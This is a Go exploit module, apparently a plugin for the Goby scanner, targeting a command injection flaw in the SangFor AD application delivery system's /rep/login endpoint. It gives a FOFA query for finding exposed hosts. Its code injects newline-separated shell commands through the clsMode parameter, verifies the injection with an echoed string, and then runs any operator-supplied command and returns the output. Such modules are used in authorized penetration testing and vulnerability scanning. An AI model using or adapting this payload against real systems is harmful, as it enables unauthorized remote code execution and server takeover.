package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"strings"
)

func init() {
	expJson := `{
    "Name": "SangFor AD login clsMode Command Execution Vulnerability",
    "Description": "<p>SangFor AD It provides users with comprehensive solutions, including multi-DC load balancing, multi-link load balancing, and server load balancing. It not only realizes real-time monitoring of the status of each data center, link and server, but also allocates the user's access request to the corresponding data center, link and server according to preset rules, so as to realize the rational distribution of data flow and make full use of all data centers, links and servers. The login interface of version 7.0.8-7.0.8r5 has command execution vulnerabilities. Attackers obtain server permissions through command concatenation</p>",
    "Product": "SANGFOR-App-Delivery-MS",
    "Homepage": "https://www.sangfor.com.cn/product-and-solution/sangfor-cloud/ad",
    "DisclosureDate": "2023-02-19",
    "Author": "1171373465@qq.com",
    "FofaQuery": "body=\"/report/report.php?cls_mode=cluster_mode_hp_clu\"",
    "GobyQuery": "body=\"/report/report.php?cls_mode=cluster_mode_hp_clu\"",
    "Level": "3",
    "Impact": "<p>Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.sangfor.com.cn/product-and-solution/sangfor-cloud/ad\">https://www.sangfor.com.cn/product-and-solution/sangfor-cloud/ad</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "id"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "深信服应用交付管理系统 login 文件 clsMode 参数命令执行漏洞",
            "Product": "SANGFOR-应用交付管理系统",
            "Description": "<p>深信服应用交付AD能够为用户提供包括多数据中心负载均衡、多链路负载均衡、服务器负载均衡的全方位解决方案。不仅实现对各个数据中心、链路以及服务器状态的实时监控，同时根据预设规则，将用户的访问请求分配给相应的数据中心、链路以及服务器，进而实现数据流的合理分配，使所有的数据中心、链路和服务器都得到充分利用。</p><p>其中 7.0.8-7.0.8R5版本 login 接口存在命令执行漏洞，攻击者通过命令拼接获取服务器权限。<br></p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://www.sangfor.com.cn/product-and-solution/sangfor-cloud/ad\">https://www.sangfor.com.cn/product-and-solution/sangfor-cloud/ad</a><br></p>",
            "Impact": "<p>攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器<br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "SangFor AD login clsMode Command Execution Vulnerability",
            "Product": "SANGFOR-App-Delivery-MS",
            "Description": "<p>SangFor AD It provides users with comprehensive solutions, including multi-DC load balancing, multi-link load balancing, and server load balancing. It not only realizes real-time monitoring of the status of each data center, link and server, but also allocates the user's access request to the corresponding data center, link and server according to preset rules, so as to realize the rational distribution of data flow and make full use of all data centers, links and servers. The login interface of version 7.0.8-7.0.8r5 has command execution vulnerabilities. Attackers obtain server permissions through command concatenation<br></p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:&nbsp;<a href=\"https://www.sangfor.com.cn/product-and-solution/sangfor-cloud/ad\">https://www.sangfor.com.cn/product-and-solution/sangfor-cloud/ad</a><br></p>",
            "Impact": "<p>Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.<br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PostTime": "2023-07-19",
    "PocId": "10714"
}`
	sendPayload235344867 := func(hostInfo *httpclient.FixUrl, cmd string) string {
		uri := "/rep/login"
		cfg := httpclient.NewPostRequestConfig(uri)
		cmd = url.QueryEscape(cmd)
		cfg.Data = "clsMode=cls_mode_login%0A" + cmd + "%0A&index=index&log_type=report&loginType=account&page=login&rnd=0&userID=admin&userPsw=123"
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		cfg.Header.Store("Content-type", "application/x-www-form-urlencoded")
		resp, err := httpclient.DoHttpRequest(hostInfo, cfg)
		if err != nil {
			return ""
		}
		return resp.Utf8Html
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			checkStr := goutils.RandomHexString(16)
			respHtml := sendPayload235344867(hostInfo, "echo "+checkStr)
			if respHtml == "" {
				return false
			}
			if !strings.Contains(respHtml, "cluster_mode_others") {
				return false
			}
			tmpStr := respHtml[strings.Index(respHtml, "cluster_mode_others"):]
			return strings.Contains(tmpStr, checkStr) && !strings.Contains(tmpStr, "echo")
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			respHtml := sendPayload235344867(expResult.HostInfo, ss.Params["cmd"].(string))
			splits := strings.Split(respHtml, "cluster_mode_others")
			if len(splits) > 1 {
				expResult.Output = splits[1]
				expResult.Success = true
			}
			return expResult
		},
	))
}
